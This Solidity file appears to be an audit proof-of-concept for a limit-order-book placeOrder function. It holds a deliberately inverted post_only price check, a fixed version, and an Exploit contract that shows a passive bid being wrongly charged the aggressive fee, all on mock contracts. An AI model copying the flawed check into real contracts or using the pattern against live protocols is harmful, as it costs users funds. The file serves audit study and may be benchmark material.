// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// AuditVault 53800 - XPress Protocol LOB.placeOrder
// post_only bids compare price_id with the wrong sign against askTree.best_offer().
// A passive bid at price_id 90 does not trip `price_id >= best` (best ask is 100),
// so it is matched and pays the aggressive commission: 1% of 10_000 ether = 100 ether.
// The fix recommended by the auditors returns 0 when `price_id <= best`.

contract ERC20Mini {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract AskBook {
    function best_offer() external pure returns (uint256) {
        return 100;
    }
}

contract LOB {
    AskBook public askTree;
    ERC20Mini public quote;
    uint256 public constant AGGRESSIVE_FEE_BPS = 100;
    uint256 public feesTaken;

    constructor(AskBook book, ERC20Mini q) {
        askTree = book;
        quote = q;
    }

    function placeOrder(uint256 price_id, uint256 quantity, bool post_only) external returns (uint64) {
        uint256 best = askTree.best_offer(); // S:best
        // @> VULN: inverted. Auditors require `if (price_id <= best) return 0`.
        bool reject = price_id >= best; // S:vuln
        if (post_only && reject) { // S:gate
            return 0;
        }
        uint256 notional = quantity * 1 ether; // S:notional
        uint256 fee = notional * AGGRESSIVE_FEE_BPS / 10_000; // S:fee
        quote.transferFrom(msg.sender, address(this), fee); // S:pull
        feesTaken += fee; // S:acc
        return 1; // S:id
    }
}

contract LOBFixed {
    AskBook public askTree;
    ERC20Mini public quote;
    uint256 public constant AGGRESSIVE_FEE_BPS = 100;
    uint256 public feesTaken;

    constructor(AskBook book, ERC20Mini q) {
        askTree = book;
        quote = q;
    }

    function placeOrder(uint256 price_id, uint256 quantity, bool post_only) external returns (uint64) {
        uint256 best = askTree.best_offer();
        bool reject = price_id <= best;
        if (post_only && reject) {
            return 0;
        }
        uint256 notional = quantity * 1 ether;
        uint256 fee = notional * AGGRESSIVE_FEE_BPS / 10_000;
        quote.transferFrom(msg.sender, address(this), fee);
        feesTaken += fee;
        return 1;
    }
}

contract Exploit {
    ERC20Mini public quote;
    AskBook public book;
    LOB public lob;
    uint64 public orderId;
    uint256 public feeCharged;

    function run() external {
        quote = new ERC20Mini("QUOTE");
        book = new AskBook();
        lob = new LOB(book, quote);
        quote.mint(address(this), 100 ether);
        quote.approve(address(lob), type(uint256).max);
        // Passive post_only bid: price_id 90, best ask 100. Quantity 10_000
        // quote units => notional 10_000 ether, aggressive fee 1% = 100 ether.
        orderId = lob.placeOrder(90, 10_000, true);
        feeCharged = lob.feesTaken();
    }
}
